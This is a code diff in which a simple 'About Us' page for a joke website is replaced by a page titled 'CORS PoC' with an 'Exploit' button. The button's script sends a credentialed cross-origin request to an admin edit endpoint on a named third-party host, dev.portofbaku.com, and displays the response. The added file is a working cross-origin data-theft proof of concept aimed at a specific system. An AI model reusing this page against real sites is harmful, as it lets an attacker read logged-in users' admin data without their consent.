@@ -1,47 +1,22 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>About Us - Hilarious Website</title>
-    <link rel="stylesheet" href="./styles.css">
-</head>
-<body>
-    <header>
-        <h1>Welcome to My Hilarious Website!</h1>
-        <nav>
-            <a href="/Hilarious-Website/index2.html">Home</a> | <a href="/Hilarious-Website/about.html">About</a> | <a href="/Hilarious-Website/contact.html">Contact</a> | <a href="/Hilarious-Website/about.html">About</a>
-        </nav>
-    </header>
-
-    <main>
-        <section>
-            <h2>About This Website</h2>
-            <p>
-                Welcome to the funniest corner of the internet! Here at <strong>Hilarious Website</strong>, we believe that laughter is the best medicine. Our goal is to bring a smile to your face every time you visit. Whether you're looking for a quick laugh or just need a little distraction from the everyday grind, we’ve got you covered.
-            </p>
-
-            <p>
-                We feature an ever-growing collection of jokes, puns, and comedic content that will make you laugh until you can’t breathe (in a good way!). Our collection is carefully curated to ensure it’s suitable for everyone—whether you love dad jokes, quirky humor, or witty one-liners.
-            </p>
-
-            <h3>Our Mission</h3>
-            <p>
-                At <strong>Hilarious Website</strong>, we aim to provide an endless source of laughter to people of all ages. Our mission is simple: make the world a happier place, one joke at a time.
-            </p>
-
-            <h3>Meet the Team</h3>
-            <p>
-                We’re a small group of comedy lovers who have come together to share our passion for humor. We search high and low for the best jokes, puns, and stories to keep you entertained. If you have a joke that can make us laugh, feel free to share it with us!
-            </p>
-        </section>
-    </main>
-
-    <footer>
-    <div class="footer-content">
-        <p>&copy; 2025 My Hilarious Website. All rights reserved.</p>
-    </div>
-</footer>
-
-</body>
-</html>
+<html>
+     <body>
+         <h2>CORS PoC</h2>
+         <div id="demo">
+             <button type="button" onclick="cors()">Exploit</button>
+         </div>
+         <script>
+             function cors() {
+             var xhr = new XMLHttpRequest();
+             xhr.onreadystatechange = function() {
+                 if (this.readyState == 4 && this.status == 200) {
+                 document.getElementById("demo").innerHTML = alert(this.responseText);
+                 }
+             };
+              xhr.open("GET",
+                       "https://dev.portofbaku.com/abI2q0N2Nl4r8Gs/admins/8/edit", true);
+             xhr.withCredentials = true;
+             xhr.send();
+             }
+         </script>
+     </body>
+ </html>
